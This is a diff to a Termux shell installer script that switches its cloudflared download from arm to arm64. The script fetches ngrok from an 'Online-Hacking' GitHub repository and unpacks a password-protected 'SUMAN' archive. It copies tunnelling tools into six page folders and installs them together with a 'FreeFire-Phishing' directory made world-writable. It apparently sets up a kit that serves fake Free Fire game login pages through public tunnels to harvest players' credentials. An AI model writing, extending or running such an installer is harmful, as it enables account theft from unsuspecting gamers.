@@ -128,7 +128,7 @@ echo -e $'\e[1;96m\e[0m\e[1;77m\e[0m\e[1;96m\e[0m\e[1;91m  !!         Download L
 echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ----------------------------------------- \e[1;91m\e[0m'
 echo ""
 wget -q --show-progress https://github.com/Online-Hacking/Mr-OnlineHacking/raw/main/Ngrok/Ngrok%20Old/ngrok -O ngrok
-wget -q --show-progress https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm -O cloudflared-linux-arm
+wget -q --show-progress https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64 -O cloudflared-linux-arm64
 echo""
 clear
 echo ""
@@ -142,7 +142,7 @@ wget -q --show-progress https://github.com/Online-Hacking/Mr-OnlineHacking/raw/m
 unrar x -Password SUMAN.rar
 rm -rf SUMAN.rar
 chmod +x ngrok
-chmod +x cloudflared-linux-arm
+chmod +x cloudflared-linux-arm64
 chmod +x FF
 chmod +x FreeFire
 clear
@@ -162,18 +162,18 @@ read -p $'\e[31m[\e[32m*\e[31m]\e[33m Enter The Ngrok Token [Ex. ./ngrok authtok
 $token
 echo ""
 echo
-cp -R cloudflared-linux-arm ngrok SUMAN/1/
-cp -R cloudflared-linux-arm ngrok SUMAN/2/
-cp -R cloudflared-linux-arm ngrok SUMAN/3/
-cp -R cloudflared-linux-arm ngrok SUMAN/4/
-cp -R cloudflared-linux-arm ngrok SUMAN/5/
-cp -R cloudflared-linux-arm ngrok SUMAN/6/
+cp -R cloudflared-linux-arm64 ngrok SUMAN/1/
+cp -R cloudflared-linux-arm64 ngrok SUMAN/2/
+cp -R cloudflared-linux-arm64 ngrok SUMAN/3/
+cp -R cloudflared-linux-arm64 ngrok SUMAN/4/
+cp -R cloudflared-linux-arm64 ngrok SUMAN/5/
+cp -R cloudflared-linux-arm64 ngrok SUMAN/6/
 chmod 7777 FreeFire-Phishing
 clear
 echo
 echo
 cp -R ngrok /data/data/com.termux/files/usr/bin
-cp -R cloudflared-linux-arm /data/data/com.termux/files/usr/bin
+cp -R cloudflared-linux-arm64 /data/data/com.termux/files/usr/bin
 cp -R SUMAN /data/data/com.termux/files/usr/bin
 cp -R FF /data/data/com.termux/files/usr/bin
 cp -R FreeFire /data/data/com.termux/files/usr/bin
